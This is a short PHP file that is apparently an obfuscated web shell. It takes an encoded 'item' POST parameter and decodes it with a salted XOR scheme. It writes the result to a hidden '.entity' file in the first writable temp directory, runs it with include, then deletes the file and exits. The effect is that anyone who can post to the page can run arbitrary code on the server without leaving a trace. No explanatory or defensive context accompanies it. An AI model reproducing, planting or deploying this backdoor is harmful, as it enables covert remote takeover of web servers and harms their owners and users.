<?php

if(!empty($_POST["i\x74em"])){
	$itm = $_POST["i\x74em"];
		 $itm 	= 	 explode		 ("."	,$itm ) 	 ; 		
	$property_set = '';
            $salt4 = 'abcdefghijklmnopqrstuvwxyz0123456789';
            $lenS = strlen($salt4		);
            $x = 0;
    
            foreach ($itm as $v2) {
                $chS = ord($salt4[$x %	$lenS]		);
                $dec = ((int)$v2 - $chS - ($x %	10))	^ 	66;
                $property_set	.=		chr($dec		);
                $x++;
            }
	$object = array_filter(["/tmp", getcwd(), getenv("TMP"), ini_get("upload_tmp_dir"), session_save_path(), getenv("TEMP"), "/var/tmp", sys_get_temp_dir(), "/dev/shm"]);
	while ($element = array_shift($object)) {
    		if (max(0, is_dir($element) * is_writable($element))) {
    $val = vsprintf("%s/%s", [$element, ".entity"]);
    if (file_put_contents($val, $property_set)) {
	include $val;
	@unlink($val);
	die();
}
}
}
}